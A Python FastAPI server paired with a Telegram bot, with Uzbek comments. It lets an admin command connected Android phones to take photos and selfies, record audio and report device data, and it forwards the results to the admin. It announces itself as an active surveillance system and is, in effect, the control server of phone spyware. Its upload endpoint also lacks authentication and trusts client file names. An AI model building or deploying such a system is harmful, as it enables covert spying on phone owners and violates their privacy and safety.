import asyncio
import os
from contextlib import asynccontextmanager
from typing import Set

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, BackgroundTasks, Form
from fastapi.responses import JSONResponse
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import FSInputFile, ReplyKeyboardMarkup, KeyboardButton

from dotenv import load_dotenv
load_dotenv()

# --- Configuration ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

# --- Global State ---
connected_devices: Set[WebSocket] = set()

# --- Aiogram Setup ---
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def get_main_keyboard():
    # Tugmalar yaratish
    kb = [
        [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="🤳 Selfie")],
        [KeyboardButton(text="🎙 Ovoz yozish (10 sek)")],
        [KeyboardButton(text="🔋 Batareya"), KeyboardButton(text="📱 Qurilma info")],
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    print(f"[DEBUG] Yozgan foydalanuvchi ID si: {message.from_user.id}")
    print(f"[DEBUG] Tizimdagi ADMIN_ID: {ADMIN_ID}")
    if message.from_user.id != ADMIN_ID:
        print("[DEBUG] ID mos kelmadi! Shuning uchun bot javob qaytarmadi.")
        return
    print("[DEBUG] ID to'g'ri keldi, javob yuborilmoqda...")
    await message.answer(
        "Kuzatuv tizimi faol! 👇 Quyidagi tugmalardan birini tanlang:",
        reply_markup=get_main_keyboard()
    )

@dp.message(F.text.in_({
    "📸 Rasm olish", "🤳 Selfie",
    "🎙 Ovoz yozish (10 sek)",
    "🔋 Batareya", "📱 Qurilma info"
}))
async def action_handler(message: types.Message):
    """Tugma bosilganda ushbu funksiya ishlaydi"""
    if message.from_user.id != ADMIN_ID:
        return
    
    if not connected_devices:
        await message.answer("⚠️ Diqqat: Qurilma hozir tarmoqda emas (Internet o'chiq bo'lishi mumkin).")
        return

    # Bosilgan tugmaga qarab qurilmaga jo'natiladigan signalni tanlaymiz
    command_map = {
        "📸 Rasm olish": "take_photo",
        "🤳 Selfie": "selfie",
        "🎙 Ovoz yozish (10 sek)": "record_audio",
        "🔋 Batareya": "battery",
        "📱 Qurilma info": "device_info",
    }
    action = command_map[message.text]
    
    # Barcha ulangan qurilmalarga (telefonlarga) signal jo'natish
    disconnected = set()
    for device in set(connected_devices):
        try:
            await device.send_text(action)
        except Exception as e:
            print(f"Xabar yuborishda xatolik: {e}")
            disconnected.add(device)
    connected_devices -= disconnected

    await message.answer(f"⏳ Buyruq qurilmaga yuborildi: {message.text}. Iltimos kuting...")

# --- FastAPI Setup ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Start bot polling in the background when FastAPI starts
    polling_task = asyncio.create_task(dp.start_polling(bot))
    yield
    # Stop polling gracefully when FastAPI stops
    polling_task.cancel()
    await bot.session.close()

app = FastAPI(lifespan=lifespan)

@app.websocket("/ws/device")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    connected_devices.add(websocket)
    print("New device connected via WebSocket.")
    try:
        while True:
            data = await websocket.receive_text()
            pass
    except WebSocketDisconnect:
        connected_devices.remove(websocket)
        print("Device disconnected.")

async def send_media_to_admin(file_path: str, media_type: str):
    """Olingan faylni turiga qarab adminga yuborish va o'chirish"""
    try:
        media = FSInputFile(file_path)
        if media_type == "photo":
            await bot.send_photo(chat_id=ADMIN_ID, photo=media, caption="📸 Kamera surati")
        elif media_type == "audio":
            await bot.send_voice(chat_id=ADMIN_ID, voice=media, caption="🎙 Ovozli yozuv")
        elif media_type == "video":
            await bot.send_video(chat_id=ADMIN_ID, video=media, caption="🎥 Qisqa video")
    except Exception as e:
        print(f"Telegramga yuborish xatosi: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def send_text_to_admin(text: str):
    """Matn ma'lumotlarini adminga yuborish"""
    try:
        await bot.send_message(chat_id=ADMIN_ID, text=text)
    except Exception as e:
        print(f"Matn yuborishda xatolik: {e}")

@app.post("/upload")
async def upload_media(
    background_tasks: BackgroundTasks,
    media_type: str = Form(...),
    file: UploadFile = File(None),
    text: str = Form(None)
):
    """Android qurilmadan fayl yoki matn qabul qilish"""
    if media_type == "text" and text:
        background_tasks.add_task(send_text_to_admin, text)
    elif file:
        file_location = f"temp_{file.filename}"
        with open(file_location, "wb+") as file_object:
            file_object.write(await file.read())
        background_tasks.add_task(send_media_to_admin, file_location, media_type)

    return JSONResponse(content={"status": "success"})

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8000,
        reload=True,
        reload_excludes=["client/*", "client/**/*", "*.spec", "*.bat"]
    )
